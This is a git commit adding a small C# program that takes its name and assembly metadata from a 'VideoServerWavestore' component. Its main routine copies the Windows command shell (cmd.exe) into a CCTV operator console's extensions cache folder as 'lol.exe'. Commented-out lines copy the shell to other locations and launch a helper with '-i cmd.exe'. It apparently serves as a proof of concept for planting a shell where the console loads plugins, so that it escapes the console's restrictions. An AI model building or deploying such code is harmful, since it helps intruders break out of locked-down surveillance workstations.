418f3602f23077cbd20633b5244e22fee0146711
hassio-git <61124205+hassio-git@users.noreply.github.com>
2023-11-21 08:11:29 +0100

    Add files via upload

---
+++ VideoServerWavestore.cs
@@ -0,0 +1,41 @@
+using System;
+using System.Diagnostics; 
+using System.IO;
+
+using System.Reflection;
+
+	[assembly: AssemblyTitle("VideoServerWavestore")]
+    [assembly: AssemblyDescription("")]
+    [assembly: AssemblyConfiguration("")]
+    [assembly: AssemblyCompany("")]
+    [assembly: AssemblyProduct("VideoServerWavestore")]
+    [assembly: AssemblyCopyright("Copyright ©  2019")]
+    [assembly: AssemblyTrademark("")]
+    [assembly: AssemblyCulture("")]
+    [assembly: AssemblyVersion("1.0.0.0")]
+    [assembly: AssemblyFileVersion("1.0.0.0")]
+
+
+
+class Program
+{
+    static void Main(string[] args)
+    {
+
+
+
+
+        Console.WriteLine("Hello, World!");
+
+		File.Copy ("c:\\windows\\system32\\cmd.exe", "H:\\Kairos\\Temp\\OperatorConsole_Cache\\Extensions\\NextVideoServerCCTV\\lol.exe");
+//		File.Copy ("c:\\windows\\system32\\cmd.exe", "c:\\program files\\telewizja\\cmd.exe");
+		Console.ReadLine();
+//        Process p = new Process();
+//        p.StartInfo.FileName = "H:\\Kairos\\Temp\\OperatorConsole_Cache\\Extensions\\NextVideoServerCCTV\\test.exe";
+//        p.StartInfo.WorkingDirectory = @"H:\\Kairos\\Temp\\OperatorConsole_Cache\\Extensions\\NextVideoServerCCTV\\";
+//        p.StartInfo.Arguments = "-i cmd.exe";
+//        p.Start();
+		Console.ReadLine();
+//		File.Copy ("c:\\windows\\system32\\cmd.exe", "H:\\Kairos\\Temp\\OperatorConsole_Cache\\Extensions\\NextVideoServerCCTV\\cmd.exe");
+	}
+}
